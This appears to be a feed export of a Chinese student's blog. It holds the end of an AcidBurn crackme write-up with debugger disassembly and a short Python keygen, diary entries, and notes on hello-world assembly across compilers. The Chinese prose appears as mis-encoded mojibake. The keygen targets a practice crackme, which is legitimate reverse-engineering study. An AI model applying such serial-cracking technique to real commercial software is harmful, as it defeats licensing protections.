class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FAA3 | <span class="number">8D</span> <span class="number">45</span> FC                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]            |</span><br><span class="line">0042FAA6 | BA AC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,å»é™¤å¼¹çª—.42FBAC                     | <span class="built_in">edx</span>:<span class="string">"|è«¦"</span>, 42FBAC:<span class="string">"CW"</span>ï¿½</span><br><span class="line">0042FAAB | E8 <span class="number">58</span> 3C FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.<span class="number">403708</span>                        |</span><br><span class="line">0042FAB0 | <span class="number">8D</span> <span class="number">45</span> F8                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]            |</span><br><span class="line">0042FAB3 | BA B8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,å»é™¤å¼¹çª—.42FBB8                     | <span class="built_in">edx</span>:<span class="string">"|è«¦"</span>, 42FBB8:<span class="string">"CRACKED"</span></span><br><span class="line">0042FAB8 | E8 4B 3C FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.<span class="number">403708</span>                        |</span><br></pre></td></tr></table></figure><p>æ¥ç€å¾€ä¸‹çœ‹ï¼Œjgeè·³è½¬åˆ°42fa79å¤„ï¼Œåˆ°42fa87å¤„eaxæŒ‡å‘äº†nameå­—ç¬¦ä¸²ï¼Œæ¥ç€è¯»å–äº†nameçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼ˆæ³¨æ„æ˜¯å­—ç¬¦â€™1â€™ï¼Œè¿™é‡Œå€¼ä¸º0x31ï¼‰ï¼Œæ¥ç€ä¸<code>ds:[431750]</code>å€¼ç›¸ä¹˜ï¼ˆå€¼ä¸º0x29ï¼‰ï¼Œå†æŠŠç»“æœä¸ç»“æœç›¸åŠ ï¼ˆä¹˜ä»¥2ï¼‰ï¼Œè¿›å…¥42faa6ï¼ŒæŠŠâ€™CWâ€™ä½œä¸ºå‚æ•°ä¼ å…¥403708ã€‚</p><p>è¿™é‡Œçš„403808å®é™…ä¸Šæ˜¯æ‹¼æ¥å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œä»¥å‰æŠŠè¿™ä¸ªå½“ä½œäº†åŠ å¯†åºåˆ—å·çš„ä¸»è¦å‡½æ•°ï¼Œç»“æœF7è¿›å»ä¹‹åæ‡µäº†ï¼Œçœ‹äº†å¤œå½±å¸ˆå‚…çš„åšå®¢æ‰æç„¶å¤§æ‚Ÿï¼ˆ<a href="https://blog.csdn.net/whklhhhh/article/details/72700446" target="_blank" rel="noopener">ä¼ é€é—¨</a>ï¼‰ã€‚</p><p>ç»§ç»­å‘ä¸‹èµ°ï¼Œ</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0042FABD | FF <span class="number">75</span> FC                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]               | [<span class="built_in">ebp</span>-<span class="number">4</span>]:<span class="string">"CW"</span></span><br><span class="line">0042FAC0 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> å»é™¤å¼¹çª—.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FAC5 | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]           |</span><br><span class="line">0042FAC8 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="built_in">eax</span>:<span class="string">"è€•B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FACD | E8 <span class="number">46</span> 6C FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.<span class="number">406718</span>                        |</span><br><span class="line">0042FAD2 | FF <span class="number">75</span> E8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]              |</span><br><span class="line">0042FAD5 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> å»é™¤å¼¹çª—.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FADA | FF <span class="number">75</span> F8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]               | [<span class="built_in">ebp</span>-<span class="number">8</span>]:<span class="string">"CRACKED"</span></span><br><span class="line">0042<span class="keyword">FADD</span> | <span class="number">8D</span> <span class="number">45</span> F4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAE0 | BA <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">5</span>                               |</span><br><span class="line">0042FAE5 | E8 C2 3E FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.4039AC                        |</span><br><span class="line">0042FAEA | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAED | 8B <span class="number">83</span> E0 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1E0]          | <span class="built_in">eax</span>:<span class="string">"è€•B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">ebx</span>+1E0]:<span class="string">"\\ç™‡"</span>=&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FAF3 | E8 <span class="number">60</span> AF FE FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.41AA58                        |</span><br><span class="line">0042FAF8 | 8B <span class="number">55</span> F0                 | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAFB | 8B <span class="number">45</span> F4                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAFE | E8 F9 3E FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.4039FC                        |</span><br><span class="line">0042FB03 | <span class="number">75</span> 1A                    | <span class="keyword">jne</span> å»é™¤å¼¹çª—.42FB1F                         |</span><br><span class="line">0042FB05 | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FB07 | B9 CC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,å»é™¤å¼¹çª—.42FBCC                     | 42FBCC:<span class="string">"Congratz !!"</span></span><br><span class="line">0042FB0C | BA D8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,å»é™¤å¼¹çª—.42FBD8                     | 42FBD8:<span class="string">"Good job dude =)"</span></span><br><span class="line">0042FB11 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           | <span class="built_in">eax</span>:<span class="string">"è€•B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FB16 | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              | <span class="built_in">eax</span>:<span class="string">"è€•B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">eax</span>]:<span class="string">"CRACKED"</span><span class="string">"CRACKED"</span></span><br></pre></td></tr></table></figure><p>åˆ°42fac8å¤„ï¼Œçœ‹åˆ°è°ƒç”¨äº†<code>ds:[431750]</code>ï¼Œçœ‹ä¸Šé¢çŸ¥é“è¿™é‡Œå­˜äº†nameé¦–å­—èŠ‚è¿ç®—åçš„ç»“æœã€‚æ‰§è¡Œå®Œ406718åï¼Œ<code>[ebp-18]</code>å¤„çš„å€¼å˜ä¸ºäº†4018ï¼Œæ­£å¥½æ˜¯<code>&#39;1&#39;*0x29*2</code>çš„ç»“æœï¼Œç»§ç»­æ‰§è¡Œï¼Œå¯ä»¥å‘ç°æœ€ç»ˆç”Ÿæˆçš„åºåˆ—å·ä¸ºCW-4018-CRACKEDï¼Œåºåˆ—å·è®¡ç®—åˆ°è¿™é‡Œå°±åˆ†æå®Œæ¯•äº†ï¼Œå³ï¼šè¾“å…¥ä¸€ä¸ªé•¿åº¦å¤§äºç­‰äº4çš„å­—ç¬¦ä¸²ï¼Œå°†å…¶é¦–å­—ç¬¦ä¹˜ä»¥0x29å†ä¹˜ä»¥2ï¼Œç»“æœå‰åŠ ä¸Šâ€CW-â€œï¼Œåé¢åŠ ä¸Šâ€-CRACKEDâ€ï¼Œæ‹¼æ¥åçš„å­—ç¬¦ä¸²å°±æ˜¯åºåˆ—å·ã€‚</p><p>ï¼ˆå¾®å‹ï¼‰æ³¨å†Œæœº2333ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = input(<span class="string">'ç¨‹åºä¸­è¾“å…¥çš„nameï¼ˆé•¿åº¦å¤§äºç­‰äº4ï¼‰ï¼š'</span>)</span><br><span class="line"><span class="comment"># å…¶å®åªè¾“å…¥é¦–å­—æ¯å°±å¥½äº†2333</span></span><br><span class="line">print(<span class="string">'ç”Ÿæˆçš„åºåˆ—å·ä¸ºï¼šCW-%d-CRACKED'</span> % (ord(s[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">2</span>) )</span><br></pre></td></tr></table></figure><p>æœ€åç»“æœå°±æ˜¯è¿™æ ·ï¼š</p><p><img src="/2019/04/23/AcidBurnåˆ†æ/3.png" alt="3.png"></p><p>æœ€åå†æ¬¡è†œå¤œå½±å¸ˆå‚…ï¼Œç®€å•å‡ å¥è¯å°±è®©æˆ‘ä»ä¸€å¤´é›¾æ°´ä¸­èµ°å‡ºæ¥~</p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190423</title>
      <link href="/2019/04/23/20190423/"/>
      <url>/2019/04/23/20190423/</url>
      
        <content type="html"><![CDATA[<p>æŠŠæœ€åˆçš„Acid Burné‚£ä¸ªé€†å‘é¢˜åˆæ¡èµ·æ¥çœ‹äº†ï¼Œä¹‹å‰çˆ†ç ´å’Œkeyæ–¹æ³•éƒ½è¯•è¿‡äº†ï¼ˆè¿™é¢˜åŒ…æ‹¬äº†å±è”½å¼¹çª—ã€æ‰¾å›ºå®škeyã€çˆ†ç ´ã€æ³¨å†Œç®—æ³•å„ç§è§£æ³•ï¼Œå‰ä¸€é˜µå§‹ç»ˆæ²¡èƒ½æŠŠè¿™ä¸ªçš„æ³¨å†Œæœºæå®šï¼‰ã€‚å¯¹ç…§å¤œå½±å¸ˆå‚…çš„æ–‡ç« ç®—æ˜¯å¯¹è¿™é“é¢˜çš„æ³¨å†Œç®—æ³•æœ‰äº†æ¯”è¾ƒæ·±åˆ»çš„äº†è§£ã€‚</p><p>å’¬ç‰™åˆèŠ±äº†ä¸‰ä½æ•°ä¹°äº†å‡ æœ¬ä¹¦ï¼Œæ·±å…¥æµ…å‡ºå¯†ç å­¦ã€é¾™ä¹¦ã€ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‚å¹¶ä¸”ç«‹ä¸‹äº†å¤§å››ä¹‹å‰<strong>ä¸å†ä¹°è¯¾å¤–å®ä½“ä¹¦</strong>çš„flagã€‚</p><p>ä¸Šäº†ç¬¬ä¸€èŠ‚ç³»ç»Ÿåˆ†æä¸è®¾è®¡ï¼Œæ„Ÿè§‰è¿˜æ˜¯å’ŒUMLä¸€æ ·è®©äººå¤´å¤§ï¼Œå†µä¸”ä¸åƒUMLä¸€æ ·æœ‰ä¸€äº›å®åœ¨çš„ä¾‹å­å»å­¦ä¹ ï¼Œå¾ˆæ‹…å¿ƒè¿™èŠ‚è¯¾èƒ½ä¸èƒ½åšæŒå¬ä¸‹å»äº†â€¦â€¦</p><p>ç›®å‰å†³å®šå°½é‡æ¯å¤©éƒ½è®°ä¸€ä¸‹å‘ç”Ÿçš„äº‹æƒ…ï¼Œå¦‚æœåšäº†é¢˜é‚£å°±å•å†™ä¸€ç¯‡ç¬”è®°ï¼Œå‘å¤œå½±å¸ˆå‚…å­¦ä¹ ~</p><p>ç¿»çœ‹å¤œå½±å¸ˆå‚…çš„åšå®¢ï¼Œæœ‰è®°è½½çš„æ˜¯ä»17å¹´5æœˆ24æ—¥åšäº†ç¬¬ä¸€é“crackmeï¼Œä»Šå¤©4æœˆ23æ—¥ï¼Œå·®ä¸å¤šä¸¤å¹´çš„æ—¶é—´ï¼Œå¤œå½±å¸ˆå‚…å·²ç»å¯ä»¥AKæ‰DDCTFçš„REï¼ˆåŒ…æ‹¬ç§»åŠ¨ç«¯ï¼‰äº†â€¦â€¦</p><p>å¸Œæœ›è‡ªå·±å¤§ä¸‰ç»“æŸä¹‹å‰æœ‰æœºä¼šå‚åŠ ä¸€æ¬¡XCTFçš„åŸ¹è®­â€¦</p><p>å‡†å¤‡å®‰æ’DYMï¼ˆé«˜ä¸­åŒå­¦ï¼‰æ¥å¨æµ·ç©</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190422</title>
      <link href="/2019/04/22/20190422/"/>
      <url>/2019/04/22/20190422/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºï¼Œåœ¨æƒ³äº†å¾ˆä¹…ä¹‹åï¼ŒæŠŠåšå®¢æ­èµ·æ¥äº†ã€‚</p><p>è™½ç„¶æ­å»ºçš„æ—¶å€™æ²¡æ·»åŠ ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ï¼Œä½†è¿˜æ˜¯æŠ˜è…¾äº†ä¸€ä¸¤ä¸ªå°æ—¶ã€‚</p><p>ä»¥å‰æ²¡å†™è¿‡å¤šå°‘ä¸œè¥¿ï¼Œç´¢æ€§ä¸è®ºè´¨é‡å…ˆæŠŠæ–‡ç« éƒ½æ‰”ä¸Šæ¥å§ã€‚</p><p>ä»Šå¤©çœ‹äº†<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">å¥ˆæ²™å¤œå½±å¸ˆå‚…çš„CSDNåšå®¢</a>ï¼Œè§‰å¾—åƒå¤œå½±å¸ˆå‚…è¿™æ ·æ¯å¤©éƒ½åšæŒè®°ä¸‹ä¸€ç‚¹å¿ƒå¾—å‘å¸ƒæ–‡ç« ï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æœ‰ç‚¹éš¾äº†ã€‚<br>ç›®å‰è¿˜æ²¡æƒ³å¥½æ€ä¹ˆç»´æŠ¤è¿™ä¸ªå°å°çš„åšå®¢ï¼Œå…ˆèµ°ä¸€æ­¥çœ‹ä¸€æ­¥äº†ã€‚</p><p>ç›®å‰æœ€è¦ç´§çš„äº‹æƒ…å¤§æ¦‚æ˜¯è¦å¤ä¹ æ“ä½œç³»ç»Ÿ/æ•°æ®åº“/é¢å‘å¯¹è±¡äº†ï¼Œè™½ç„¶Pythonç¬¬ä¸€ä¸ªè€ƒè¯•ï¼Œä½†æ˜¯è€ƒæŸ¥è¯¾æ²¡ä»€ä¹ˆéœ€è¦æ…Œçš„ã€‚</p><p>è¿˜æ˜¯è§‰å¾—Pythonè¯¾æ¯”è¾ƒæ°´ï¼Œä¸çŸ¥é“è€ƒè¯•ä¼šä¸ä¼šè€ƒDjango + vueé‚£äº›ä¸œè¥¿â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—è¯»ä¹¦ç¬”è®°-3</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬ç« ä»¥ç»å…¸çš„hello worldç¨‹åºè§£é‡Šäº†åœ¨x86ã€x86-64ã€ARMã€MIPSä¸åŒæ¶æ„ä¸‹ä¸åŒç¼–è¯‘ç¯å¢ƒäº§ç”Ÿçš„ç»“æœçš„å·®å¼‚</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h4 id="MSVC2010"><a href="#MSVC2010" class="headerlink" title="MSVC2010"></a>MSVC2010</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">    <span class="keyword">push</span> offset $sg3830     <span class="comment">;å¯¹åº”å­—ç¬¦ä¸²å­˜å‚¨åœ°å€ï¼Œç¬”è®°ä¸­æ²¡æœ‰è®°è¿°å…¨éƒ¨çš„ä»£ç </span></span><br><span class="line">    <span class="keyword">call</span> _printf</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>              <span class="comment">;å°†æ ˆæŒ‡é’ˆç§»å‡ºï¼Œ4å¯¹åº”32ä½å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>æ±‡ç¼–è¯­è¨€å­˜åœ¨ä¸¤ç§è¯­ä½“ï¼ŒIntelä»¥åŠAT&amp;Tï¼Œä¸Šè¿°æ±‡ç¼–è¯­è¨€ä¸ºIntelè¯­ä½“</p><h4 id="GCC-4-4-1"><a href="#GCC-4-4-1" class="headerlink" title="GCC 4.4.1"></a>GCC 4.4.1</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main    proc <span class="built_in">near</span></span><br><span class="line">var_10  = <span class="built_in">dword</span> <span class="built_in">ptr</span> - <span class="number">10h</span></span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="number">0fffffff0h</span>     <span class="comment">;ä½¿esp 16å­—èŠ‚å¯¹é½</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, offset aHelloWorld        <span class="comment">;"Hello world\n"</span></span><br><span class="line">        <span class="comment">;å…ˆç”¨eaxå­˜å‚¨å­—ç¬¦ä¸²çš„åœ°å€</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">esp</span> + <span class="number">10h</span> + var_10], <span class="built_in">eax</span>   </span><br><span class="line">        <span class="keyword">call</span> _printf</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span>      <span class="comment">;æ²¡æœ‰ä¼˜åŒ–</span></span><br><span class="line">        <span class="keyword">leave</span></span><br><span class="line">        <span class="keyword">retn</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><h4 id="GCC-4-7-3-AT-amp-Tï¼ˆå¸¸è§äºUNIXï¼‰"><a href="#GCC-4-7-3-AT-amp-Tï¼ˆå¸¸è§äºUNIXï¼‰" class="headerlink" title="GCC 4.7.3: AT&amp;Tï¼ˆå¸¸è§äºUNIXï¼‰"></a>GCC 4.7.3: AT&amp;Tï¼ˆå¸¸è§äºUNIXï¼‰</h4><p>å°æ•°ç‚¹å¼€å¤´çš„æŒ‡ä»¤ä¸ºå®ï¼Œå¯è¯»æ€§å·®ï¼Œå¿½ç•¥å®ä¹‹åä»£ç å¦‚ä¸‹:</p><p>(markdownä¸æ”¯æŒAT&amp;Tè¯­ä½“ä»£ç é«˜äº®)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.lc0:</span><br><span class="line">        .string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">        pushl %ebp</span><br><span class="line">        movl %esp, %ebp</span><br><span class="line">        andl $-16, %esp</span><br><span class="line">        subl $16, %esp</span><br><span class="line">        movl $.lc0, (%esp)</span><br><span class="line">        call printf</span><br><span class="line">        movl $0, %eax</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></p><p>Intelä¸AT&amp;TåŒºåˆ«ï¼š</p><ul><li>è¿ç®—è¡¨è¾¾å¼ä¹¦å†™é¡ºåºç›¸å</li><li>AT&amp;Tä¸­åœ¨å¯„å­˜å™¨å‰åŠ %ï¼Œåœ¨ç«‹å³æ•°å‰åŠ $ï¼Œä½¿ç”¨åœ†æ‹¬å·ï¼ˆIntelä½¿ç”¨æ–¹æ‹¬å·ï¼‰</li><li>AT&amp;Tè¿ç®—æ“ä½œç¬¦éœ€è¦å£°æ˜æ“ä½œæ•°ç±»å‹</li><li><ol><li>-q quad(64ä½)</li></ol></li><li><ol start="2"><li>-l 32ä½long</li></ol></li><li><ol start="3"><li>-w 16ä½word</li></ol></li><li><ol start="4"><li>-b 8ä½byte</li></ol></li><li>â€¦â€¦</li></ul><h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><h4 id="MSVC-2012-x64"><a href="#MSVC-2012-x64" class="headerlink" title="MSVC 2012 x64"></a>MSVC 2012 x64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main    proc</span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">rcx</span>, offset flat:$sg2989</span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><p>64ä½å¯„å­˜å™¨åœ¨32ä½åŸºç¡€ä¸Šæ‰©å±•ï¼Œä»å¯ç”¨eå¼€å¤´æ­£å¸¸ä½¿ç”¨32ä½å¯„å­˜å™¨</p><h4 id="GCC-4-4-6-X64"><a href="#GCC-4-4-6-X64" class="headerlink" title="GCC 4.4.6 X64"></a>GCC 4.4.6 X64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.string</span> <span class="string">"Hello world\n"</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, offset flat:.lc0   <span class="comment">;"hello world"</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>å‰å…­ä¸ªå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼›å¯¹Eå¯„å­˜å™¨ä½¿ç”¨movå†™å…¥æ—¶ï¼Œå¯¹åº”çš„Rå¯„å­˜å™¨é«˜32ä½ä¼šè¢«ç½®0</p><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h4 id="Keli-6-2013-ARMæ¨¡å¼"><a href="#Keli-6-2013-ARMæ¨¡å¼" class="headerlink" title="Keli 6/2013 ARMæ¨¡å¼"></a>Keli 6/2013 ARMæ¨¡å¼</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main</span></span><br><span class="line">        <span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">lr</span>&#125;     <span class="comment">;ç›¸å½“äºpushï¼ŒæŠŠr4å’Œlr(link register)çš„å€¼æ”¾åˆ°æ•°æ®æ ˆä¸­</span></span><br><span class="line">        <span class="keyword">adr </span><span class="built_in">r0</span>, aHelloWorld     <span class="comment">;å°†å­—ç¬¦ä¸²åç§»ä¸pcç›¸åŠ ï¼Œç»“æœå­˜å‚¨åˆ°r0</span></span><br><span class="line">        <span class="keyword">bl </span>__2printf    <span class="comment">;å°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å­˜å…¥lrï¼Œå°†printf()åœ°å€å†™å…¥pc</span></span><br><span class="line">        <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">pc</span>&#125;     <span 